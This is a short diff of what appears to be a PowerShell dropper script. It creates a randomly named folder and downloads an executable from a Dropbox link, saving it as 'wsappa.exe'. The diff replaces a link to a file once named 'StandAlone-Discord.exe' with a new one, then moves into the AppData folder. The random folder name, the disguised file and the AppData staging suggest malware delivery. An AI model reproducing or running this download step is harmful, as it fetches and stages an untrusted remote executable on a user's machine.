@@ -8,7 +8,7 @@ mkdir sVBXKuz
 cd sVBXKuz
 
 #download executable and startup file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile wsappa.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/snbp53811ysy27yotn7pr/wsappa.exe?rlkey=15j3rv0qlkeu1nwphnedezq6o&dl=0" -OutFile wsappa.exe
 
 #sets location appdata
 cd $env:appdata 
